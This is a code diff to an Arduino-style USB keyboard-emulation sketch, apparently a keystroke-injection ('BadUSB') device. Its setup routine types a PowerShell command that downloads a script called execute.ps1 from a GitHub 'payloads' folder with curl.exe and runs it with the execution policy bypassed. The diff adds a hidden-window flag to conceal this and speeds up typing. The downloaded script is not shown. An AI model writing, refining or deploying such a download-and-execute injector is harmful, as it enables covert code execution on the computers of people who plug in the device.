@@ -3,7 +3,7 @@
 #include "keyboardLayout/Keyboard_de_DE.h"
 
 USBHIDKeyboard Keyboard;
-void typeString(const char* str, unsigned int delayBetweenKeys = 10) {
+void typeString(const char* str, unsigned int delayBetweenKeys = 5) {
   for (size_t i = 0; i < strlen(str); i++) {
     char c = str[i];
     Keyboard.press(c);
@@ -22,7 +22,7 @@ void setup() {
   delay(50);
   Keyboard.releaseAll();
   delay(500);
-  const char* cmd = "powershell.exe -NoProfile -Command \"$p = Join-Path $env:USERPROFILE 'execute.ps1'; curl.exe 'https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/execute.ps1' -o $p; powershell.exe -ExecutionPolicy Bypass -File $p\"";
+  const char* cmd = "powershell.exe -WindowStyle Hidden -NoProfile -Command \"$p = Join-Path $env:USERPROFILE 'execute.ps1'; curl.exe 'https://raw.githubusercontent.com/e30301/usbHIDscripts/refs/heads/main/payloads/execute.ps1' -o $p; powershell.exe -ExecutionPolicy Bypass -File $p\"";
   typeString(cmd, 15);
   Keyboard.press(KEY_RETURN);
   delay(10);
